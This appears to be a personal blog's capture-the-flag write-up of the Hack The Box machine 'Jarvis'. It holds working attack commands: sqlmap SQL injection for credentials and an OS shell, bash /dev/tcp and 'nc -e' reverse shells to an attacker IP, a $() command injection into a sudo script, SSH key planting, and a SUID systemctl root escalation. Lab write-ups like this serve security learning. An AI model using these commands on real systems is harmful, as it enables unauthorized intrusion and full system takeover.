<!DOCTYPE html>
<html lang="en" prefix="og: https://ogp.me/ns#">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible"
      content="IE=edge">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0" />
<meta name="description"
      content="Adventures of Functional Mediocrity" />
<meta name="keywords"
      content="zola, theme, ink, hugo-ink" /> 

<title>John Tuyen | Jarvis</title>
<meta
  property="og:title"
  content="John Tuyen | Jarvis"
/>
<meta property="og:type" content="website" />
<meta property="og:url" content="https://johntuyen.com/posts/htb-jarvis/" />
<meta property="og:description" content="Adventures of Functional Mediocrity" />
<meta property="og:image" content="" />
<meta property="og:image:url" content="" />
<meta property="og:image:secure_url" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Jarvis" />
<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
<meta property="twitter:image" content="" />

<link rel="alternate"
          type="application/rss+xml"
          title="John Tuyen"
          href="https://johntuyen.com/atom.xml">
    <link rel="preconnect"
          href="https://fonts.googleapis.com">
    <link rel="preconnect"
          href="https://fonts.gstatic.com"
          crossorigin>
    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
          rel="stylesheet">
    <link rel="stylesheet"
          href="https://johntuyen.com/base.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
            crossorigin="anonymous"></script>
</head>

<body>
    <header>
        <a class="site-name"
           href="/">
            <h1>John Tuyen</h1>
        </a>
        <div class="site-description">
            <p>Adventures of Functional Mediocrity</p>
        </div>
        <nav>
            <div class="links"> 
            <a 
                href="https://johntuyen.com/ ">About</a> 
            <a 
                href="https://johntuyen.com/posts/ ">Posts</a> 
            <a 
                href="https://johntuyen.com/gallery/ ">Gallery</a> 
            <a 
                href="https://johntuyen.com/tags/ ">Tags</a> 
            <a 
                href="https://johntuyen.com/search/ ">Search</a> 
            </div>
        </nav>
    </header>
    <article>
    

<section class="post">
  <div class="post-header">
    <div class="meta">
      <div class="date">
        <span class="day">09</span>
        <span class="rest">Nov 19</span>
      </div>
    </div>

    <div class="matter">
      <h1 class="title">Jarvis </h1>
    </div>
  </div>
    
  <article><ol>
<li>
<p>Port 80 and 64999. Port 80 hosts a bootstrap website. Port 64999 shows I've been banned for 90 seconds page. I don't think that part of true as my scans were still running but we'll note this down for now.</p>
</li>
<li>
<p><code>nikto</code> scans shows that there is a phpmyadmin being hosted on port 80 and the version can be found at: <a href="http://jarvis/phpmyadmin/ChangeLog">http://jarvis/phpmyadmin/ChangeLog</a> - version 4.8.0 (2018 04 07)</p>
<p>After reading couple of exploits for phpmyadmin 4.8.0, I decided to try to use Metasploit module and see if it will work. Unfortunately it didn't.</p>
<p><img src="https://johntuyen.com/posts/htb-jarvis/htb-jarvis-msfconsole.png" alt="htb-jarvis-msfconsole.png" /></p>
</li>
<li>
<p>Being stuck on this problem for couple of hours, all my scans show up without much useful information to work with. The only thing left I could think about are SQL injections which I did had a hunch about from reading the past phpmyadmin exploits.</p>
<p>But where do we begin to perform SQL injections? Browsing the Jarvis website, there is a page that shows a list of room suites and the URL generates a <code>cod=5</code> parameter. I'm going to test to see if it's vulnerable to SQL injection.</p>
<p>Using <code>burpsuite</code>, I saved a GET request to a file so I can use <code>sqlmap</code> to read it.</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>sqlmap -r singlereq -p cod --passwords
</span></code></pre>
<p><img src="https://johntuyen.com/posts/htb-jarvis/htb-jarvis-sqlmap.png" alt="htb-jarvis-sqlmap.png" /></p>
<p>Looks like I got a hit for the phpmyadmin login and password. I'll keep this aside and see if I could get a shell that we can upload files with.</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>sqlmap -r singlereq -p cod --os-shell
</span></code></pre>
<p>An os-shell is accessible and we're able to upload and execute a PHP reverse shell file for a <code>www-data</code> user shell.</p>
</li>
<li>
<p>Running the <code>linenum</code> and <code>linuxprivchecker</code> scripts showed there is a sudoers access to a python file at <code>/var/www/Admin-Utilities/simpler.py</code></p>
<p>After reviewing the python script, there is a ping function that blacklists certain characters. Doing some online research shows there is a way to execute commands with $, (, and ) characters.</p>
<p>Before we do that, lets create a reverse shell script for execution.</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.9/8080 0&gt;&amp;1&quot; &gt; /var/tmp/rs.sh
</span></code></pre>
</li>
<li>
<p>Execute the simpler.py script:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
</span></code></pre>
<p>When the prompt shows up asking for an IP, enter this command:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>$(bash /tmp/rs.sh)
</span></code></pre>
<p><img src="https://johntuyen.com/posts/htb-jarvis/htb-jarvis-simpler.png" alt="htb-jarvis-simpler.png" /></p>
<p>A reverse shell with <code>pepper</code> user access has now been established and able to obtain the user.txt flag.</p>
</li>
</ol>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<ol>
<li>
<p>Reading through my <code>linenum</code> and <code>linuxprivchecker</code> scripts, I noticed that the <code>systemctl</code> binary has an SUID flag set.</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctl
</span></code></pre>
<p>According to <a href="https://gtfobins.github.io/gtfobins/systemctl/">GTFOBins</a>, SUID set can lead to privilege escalation. It wasn't as easy as I thought.</p>
<p>I tried following the instructions and it will throw shell related errors such as:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>The name org.freedesktop.PolicyKit1 was not provided by any .service files
</span></code></pre>
</li>
<li>
<p>I haven't seen these type of errors before and googling didn't help. Asking for HTB users for a hint, I would have never thought of escalating my shell to something more stable. At first when I thought about this hint, I thought it meant that I should reverse shell again somewhere. Then I remembered that SSH was enabled on this box but how would I log in if I don't have the password for <code>pepper</code> user and can't execute <code>passwd</code> to change it? A light bulb went off and I figured since I am <code>pepper</code> technically, I can create ssh <code>authorized_keys</code> into the <code>pepper</code> home directory with my own public key and ssh using my private key.</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>mkdir .ssh
</span><span>
</span><span>wget http://10.10.14.9/id_rsa.pub ~/.ssh/authorized_keys
</span></code></pre>
<p>Then we SSH using my private key for access:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>ssh -i ~/.ssh/id_rsa pepper@jarvis
</span></code></pre>
<p>Now we can begin with following GTFOBins <code>systemctl</code> instructions and it should now work.</p>
</li>
<li>
<p>Create the service file using <code>systemctl</code> with modified ExecStart value using <code>nc</code>:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>TF=privesc.service
</span><span>echo &#39;[Service]
</span><span>Type=oneshot
</span><span>ExecStart=/bin/sh -c &quot;/bin/nc -e /bin/sh 10.10.14.9 4444&quot;
</span><span>[Install]
</span><span>WantedBy=multi-user.target&#39; &gt; $TF
</span></code></pre>
</li>
<li>
<p>Create a symbolic link using <code>systemctl</code>:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>/bin/systemctl link /home/pepper/privesc.service
</span></code></pre>
</li>
<li>
<p>Setup a <code>nc</code> session to receive the root reverse shell:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>nc -nvlp 4444
</span></code></pre>
</li>
<li>
<p>Enable the newly created service using <code>systemctl</code>:</p>
<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>/bin/systemctl enable --now /home/pepper/privesc.service
</span></code></pre>
<p><img src="https://johntuyen.com/posts/htb-jarvis/htb-jarvis-systemctl.png" alt="htb-jarvis-systemctl.png" /></p>
<p><img src="https://johntuyen.com/posts/htb-jarvis/htb-jarvis-rooted.png" alt="htb-jarvis-rooted.png" /></p>
</li>
</ol>
<p><code>Protip</code>{: .info }</p>
<p>Always try to execute binaries as absolute paths and in different directories. Sometimes you'll get cases where files don't get executed where you saved the files.</p>
</article>

  
    
  
  <ul class="tags">
    
      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
    
  </ul>
  
  
    
</section>
</article>
    <footer>
        <div class="social">
            <ul> 
                 
                <li>
                    <a href="https://github.com/jtuyen"
                       title="Github" rel="me"><i data-feather="github"></i></a>
                </li>
                 
                 
                <li>
                    <a href="https://twitter.com/jtuyen"
                       title="Twitter"
                       rel="me"><i data-feather="twitter"></i></a>
                </li>
                
                
                
                <li>
                    <a href="https://johntuyen.com/atom.xml"
                       title="John Tuyen"><i data-feather="rss"></i></a>
                </li>
            </ul>
        </div>
        <p> © John Tuyen 2024

        
        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
        </p>
    </footer>
    <script>
        feather.replace();
    </script> 
    </body>
</html>